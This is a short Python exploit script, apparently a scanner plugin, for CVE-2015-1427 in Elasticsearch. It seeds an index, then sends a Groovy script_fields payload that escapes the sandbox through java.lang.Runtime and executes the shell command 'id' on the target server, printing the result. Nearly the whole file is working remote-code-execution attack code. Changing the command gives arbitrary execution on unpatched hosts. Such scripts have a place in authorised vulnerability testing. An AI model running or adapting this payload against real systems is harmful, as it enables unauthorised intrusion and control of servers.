import requests
import json
requests.packages.urllib3.disable_warnings()
def run(url):
    """CVE-2015-1427"""
    headers = {'Content-Type':'application/x-www-form-urlencoded'}
    req = requests.post(url+':9200/website/blog/', headers=headers, data="""{"name":"test"}""", timeout=3)  # es 中至少存在一条数据, so, 创建

    data = {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
    req = requests.post(url+':9200/_search?pretty', headers=headers, data=json.dumps(data), timeout=3)

    if req.status_code == 200:
        print(req.text)
        return 'ElasticSearch Remote Code Exec2 ~ '
    else:
        return False